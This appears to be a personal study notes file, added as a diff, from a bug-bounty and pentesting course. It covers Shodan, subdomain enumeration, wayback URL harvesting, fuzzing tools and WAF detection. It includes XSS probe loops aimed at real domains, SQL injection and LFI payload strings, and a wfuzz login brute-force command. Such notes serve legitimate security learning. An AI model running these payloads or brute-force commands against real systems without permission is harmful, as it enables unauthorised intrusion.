@@ -1,0 +1,488 @@
+Recon&bungbounty&pentesting course
+>> First create the shodan account
+
+commands of shodan
+
+>> shodan init <api-key>
+
+>> shodan -h
+
+>>shodan info 
+
+>> shodan version
+
+>> shodan count openssh
+
+>> shodan count openssh 7
+
+>> shodan count bigip
+
+
+++++++++++++++++
+
+→ shodan scan downloads
+ 
+ >> shodan download
+ 
+ >> shodan download bigipfile bigip
+ 
+ >> gunzip bigipfile.json.gz
+ 
+ >> cat bigipfile.json
+ 
+ copy and paste the whole output to
+>> jsonbeautifier.org
+
+→ shodan host Enumeration
+
+>> shodan download bigipfile bigip --limit 50
+
+>> shodan host 1.1.1.1
+
+>> shodan host 8.8.8.8
+
+→  shodan parse dataset
+
+>> shodan myip
+
+>> whois myip
+
+>> shodan parse
+
+>> shodan parse bigipfile.json
+
+→ shodan search
+
+>> shodan search -h
+
+>> shodan search ssh
+
+→ shodan scan
+
+>> shodan scan -h
+
+>> shodan scan submit targetip
+
+>>bgp.he.net --google search
+
+>> shodan scan submit 206.166.248.0/23
+
+>> shodan scan submit --filename scan-results.json.gz 1.1.1.1
+
+>> gunzip scan-results.json.gz
+
+>> more scan-results.json
+
+→ shodan stats
+
+>> shodan stats ftp
+
+>> shodan stats bigip
+
+→ shodan GUI
+
+>> https://shodan.io/home
+
+→ shodan exploits
+
+>> https://exploits.shodan.io/
+
+>> bigip, apache these are search quaries
+
+→ shodan cve 2020-3452 File Read
+
+>> +CSCOE+
+
+→  subdomain enumeration
+
+>> chaos.projectdiscovery.io
+
+>> finddomain -t starbucks.com -r -o
+
+>> nmmapper.com to find the domains
+
+→ shodan hunting jenkins
+
+>> medium/@sw33tlie/
+
+>> shodan search ===  html:"Dashboard Jenkins" http.component:"jenkins"
+------------------------------------------------------------------------------------------------------------------------------
+>> Section --5::-Certificate Transparency for Subdomain Enumeration
+------------------------------------------------------------------------------------------------------------------------------
+>> crtsh
++++ gov.in
++++ nciipc.gov.in >>this is the indian  security reporting
++++ rvdp@nciipc.gov.in
+
+>> shodomain
+++ python shodomain.py apikey example.com
+
+>>censys tool
+
+>> https://developers.facebook.com/tools/ct
+
+>>https://transparencyreport.google.com/https/certificates
+--------------------------------------------------------------------------------------------------------------------------------
+>> section --6:: -scope expansion
+--------------------------------------------------------------------------------------------------------------------------------
+Tools:---
+>> https://pentest-tools.com
+>> https://virustotal.com
+>>virustotal.com
+ >>PhishTank
+>> sublister
+python sublist3r -d yahoo.com -b
+python sublist3r -d yahoo.com -b -v
+python sublist3r -d yahoo.com -b -v -e google,virustotal
+python sublist3r -d yahoo.com -b -v -e -t 100
+python sublist3r -d uber.com -b -v -t 100
+
+>> chaos.projectdiscovery.io
+>> https://github.com/dr-0x0x/chaospy
+
+python3 chaospy.py -h
+python3 chaospy.py -l
+python3 chaospy.py -l | grep zomato
+python3 chaospy.py -d Zomato
+python3 chaospy.py -bc
+python3 chaospy.py -h1
+python3 chaospy.py -dbc (download the bugcrowd programs list)
+python3 chaospy.py -dh1 (download the hackerone programs list)
+
+>> https://www.nmmapper.com/sys/tools/subdomainfinder/
+
+-----------------------------------------------------------------------------------------
+>> section --7:: -Diving in depth of Archives for Bug Bounties
+----------------------------------------------------------------------------------------
+>> https://archive.org/web/
+>>https://web.archive.org/web/*/hackerone.com/*
+
+>> tools:
+>> https://github.com/tomnomnom/waybackurls
+>> nano apple.txt
+>> cat apple.txt | waybackurls > applewayback.txt
+>>
+
+>> waybackurls tips
+
+>> qsreplace github/tomnomnom 
+>> all the tools installing in /bin directory
+>> cd /bin 
+
+ how to perform waybackurls
+
+ # waybackurls testphp.vulnweb.com	| tee testphp1.txt | qsreplace
+ # waybackurls testphp.vulnweb.com	| tee testphp1.txt | qsreplace FUZZ
+ # waybackurls testphp.vulnweb.com	| tee testphp1.txt | qsreplace FUZZHACK
+ # waybackurls testphp.vulnweb.com	| tee testphp1.txt | qsreplace FUZZHACK
+
+ # waybackurls testphp.vulnweb.com	| tee testphp1.txt | qsreplace '"><script>confirm(1)</script>' | tee combinedfuzz.json &&  cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot vulnerable\n"done
+
+>> paramspider tool
+>> devanshbatham/paramspider ->github
+ tool usage: 
+
+ -> python3 paramspider.py --domain example.com --output o example.txt
+ -> python3 paramspider.py --domain example.com --output o example.txt --level high
+ -> python3 paramspider.py --domain example.com --output o example.txt --level high --exclude woff,css,js,png,svg,php,jpg
+
+ -> python3 paramspider.py -d orientalbirdimages.org | tee yy.json | qsplace '"><script>confirm<script>' | while read host do ; do curl --silent -- path -as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n"; done
+
+ -> python3 paramspider.py --domain example.com --placeholder fuzzz
+ > payloads for seclists or payloadallthings
+
+-> python3 paramspider.py -d optimizely.com --subs false
+
+python3 paramspider.py -d optimizely.com --subs false --placeholder '"><script>confirm<script>' > optimizely.txt | while   read host do ; do curl --silent -- path -as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n"; done
+
+-> 
+
+>> hunt to live domains
+
+step1 
+
+python3 paramspider.py -d optimizely.com --subs false
+
+step2
+python3 paramspider.py -d optimizely.com
+
+step3
+python3 paramspider.py -d optimizely.com --subs false > optimizely.txt
+
+step4
+cat optimizely.txt
+
+step5
+python3 paramspider.py -d optimizely.com --subs false --placeholder '"/><script>confirm(1)</script>' > optimizely.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
+
+toolname -gau
+github.com/lc/gau
+gau -version
+gau apple.com -subs -o applesubs.txt
+
+
+DNS Enumeration for Bug Bounties
+--------------------------------------
+
+                        DNS dumpster
+
+>>DNSdumpster.com
+>>						
+						DNS Goodies (dnsgoodies.com)
+						DNS query site
+
+>>whois - Domain/IP
+>>DNS Query Lookup
+>>Reverse DNS Lookup
+>>Openrelay check
+>>Spam database check
+>>What is my ip
+>>ping
+>>Abuse Lookup
+>>Traceroute
+
+---------------------------------------
+							subdoamin takeover
+{finddomain} contains lot of subdomains
+
+example.com
+
+ping example.com
+
+you got ip address
+
+whois ipaddress
+
+							tools
+
+>>aquaton
+>>subjack
+>>subzy
+>>nmmapper.com
+>>https://hacktify.in/mindmap.png							
+
+
+							XSS hunting 
+------------------------------------------------------------------------------
+							CMS Identification
+
+>> wappalyzer.com/lookup
+>> builtwith.com/toolbar
+>> whatweb(whatweb.net) -> github whatweb
+>> Netcraft(Netcraft extension)
+>> bgp.he.net
+>> Retire.js
+-- retirejs.github.io/retire.js
+-- retirejs chrome extension
+
+https://www.udemy.com/home/my-courses/learning/
+------------------------------------------------------------------------------------
+							Fuzzing
+
+						>> why is it so important?
+++ to increase the scope
+++ Get cves
+++ play smart , make your hunting process more easy and effictive 
+++ Find what others missing
+++ Find what others missing endpoints
+++ Find default configured servers
+++ Find hardcode tokens, api-keys, base64 encoded creds
+++ Do better then others
+						>> Reconnaissance
+++ Better enumeration
+++ Content Discovery
+++ Mass Hunting
+++ Find Xss
+++ Find OR
+++ Find Sqli
+++ Find PII
+
+bugs: 
+
+		Attacker					www.example.com/FUZZ
+									www.example.com/id=1
+
+		Sqli 						admin' or '1'='1
+		code injection				whoami
+		sensitive data exposure		/users
+		LFI							/etc/passwd
+		Xss 						"><img src=x onerror=confirm(1)>
+
+>> fuzzing step by step
+++ fuzzing vs conventional static code analysis
+
+			Fuzzing 							Static Analysis
+
+          ++ Runtime analysis                    Code bugs
+          ++ Juicy Endpoints                     Improper programming practice
+          ++ Better to find issues               Non Live states
+
+>> process for fuzzing 
+				
+				-> set target 
+
+						injection points			
+								++ Find endpoints to give input
+								++ Check for parameters
+								++ Check for Headers
+
+				-> set payload wordlist
+
+						Right wordlists for Fuzz
+								++ CMS based wordlists
+								++ common/Long names wordlists
+								++ Special characters wordlists
+
+				-> start fuzzing
+
+						 Right wordlists for Fuzz
+						 		++ manual
+						 		++ Automation
+						 		++ Automation + Wayback = $$$
+
+				-> Monitoring Fuzzing
+
+						 Analysis for Fuzz
+						 		++ Analysis for patterns
+						 		++ Different Anomalies/Content Length
+						 		++ Special keywords/Grep response
+						 		
+
+				-> Fuzzing on lab
+
+						++ github.com Seclists/Fuzzing(https://github.com/danielmiessler/SecLists)
+						++ github.com/fuzzdb-project/fuzzdb()
+						++ github.com payloadallthings(https://github.com/swisskyrepo/PayloadsAllTheThings)
+						++ github.com dirsearch/db/dicc.txt(https://github.com/maurosoria/dirsearch)
+
+				-> Fuzzing on live websites
+
+						steps for fuzz
+							++  choose Target endpoint
+							++  choose the wordlist
+							++ special keywords/Grep Response
+
+				-> Fuzzing for sensetive files and data
+						
+						steps 								
+
+							www.example.com/Fuzz
+
+							GET /$1$ HTTP/1.1
+
+				-> Fuzzing multiple layers
+
+				-> Wfuzz installation 
+
+						 ++ pip3 install wfuzz
+						 ++ $wfuzz -w wordlist.txt http://example.com/FUZZ
+						 ++ https://github.com/xmendez/wfuzz
+						 ++ github.com/danielmiessler/SecLists
+						 ++ github.com/fuzzdb-project/fuzzdb
+
+						 check wfuzz installed or not
+						 Enter wfuzz
+
+					wfuzz -c -w ~/tools/word/seclists/Fuzing/LFI/dicc.txt http://testphp.vulnweb.com/FUZZ
+					wfuzz -c --hc 404,400,403,500 -w ~/tools/word/seclists/Fuzing/LFI/dicc.txt http://testphp.vulnweb.com/FUZZ
+					
+>> wfuzz Login auth bruteforce
+
+++ wfuzz -z file, users.txt -d "username=FUZZ&password=FUZZ"http://example.com
+
+These requests will be generated
+
+wfuzz will take usernames from the list
+wfuzz will use it and replace in username and password
+it will do BF, and success
+	
+	practice site:
+		|| https://srsecure.xyz/somaiya/
+|| wfuzz -c -z file,users.txt --hs "Try Harder" -d "username=FUZZ&password=FUZZ" https://srsecure.xyz/somaiya/index.php
+
+
+
+						>> Fuff installation
+
+	Things reqiured
+	++ Go language
+	++ FFuf
+	++ wordlists
+						
+				go get github.com/ffuf/ffuf
+				
+					>>  Fuff working
+
+			wordlist                            Requests
+			--------				            ----------
+			info.php							example.com/info.php
+			index.html                          example.com/index.html
+			backup.zip							example.com/backup.zip
+
+			how to use :-
+				ffuf -u "https://example.com/FUZZ" -w wordlist.txt
+
+https://exmaple.com/FUZZ -recursive -w wordlist.txt
+
+ffuf -w wordlist.txt -u https://example.com/FUZZ -e .aspx,.html,.php,.txt,.conf,.bak -c
+
+-c means color
+
+The words from the wordlist - wordlists.txt
+
+Command - ffuf -w wordlist.txt -u http://website.com/FUZZ -e .aspx,.html,.php,.txt
+
+ffuf -u "https://lyncdiscover.sm.sony.com/FUZZ" -w
+
+ffuf -u "https://bugbountytarget.com/FUZZ" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -fc 301
+
+-m 200,500
+
+		>> Dirsearch
+
+		python3 dirsearch.py -u http://example.com -e php,zip,aspx,env,xml,bak,conf
+clea
+---------------------------------------------
+						-> WAF identification
+>> waf detection with nmap
+				++ waf detect scan
+ syntax:nmap <target-ip><--script=http-waf-detect>
+ -- you can scan a target by simply giving an ip address and specify  the http-waf-detect
+ -- you can add -v  to see verbose output
+ eg: nmap 192.168.43.123 --http-waf-detect
+     nmap example.com --script=http-waf-detect -p80,443 -v
+
+     			++ waf fingerprint scan
+     syntax: nmap <target-ip> <--script=http-waf-fingerprint>
+  -- you can scan a target by simply giving an ip address and specify  the http-waf-fingerprint
+  -- you can add -v  to see verbose output
+ eg: nmap 192.168.43.123 --http-waf-fingerprint
+ nmap example.com --script=http-waf-fingerprint -p80,443 -v
+ 				++ wafwOOf vs Nmap scan
+ 	syntax: wafwoof <target.com>
+ 	syntax: nmap <target-ip> <--script=http-waf-fingerprint>
+ 	-- you can scan a target by simply giving an ip address and specify  the http-waf-fingerprint
+ 	-- you can add -v  to see verbose output
+ eg: nmap 192.168.43.123 --http-waf-fingerprint
+
+ apt-get install wafw00f
+
+eg: wafw00f noodle.com
+------------------------------------------------------------------------
+							Google Dorks
+
+Google dorks manually
+
+-------------------------------------------------------------------
+							Recon mind map 
+
+						
+
+
+
+
+
+
+
+
+ 
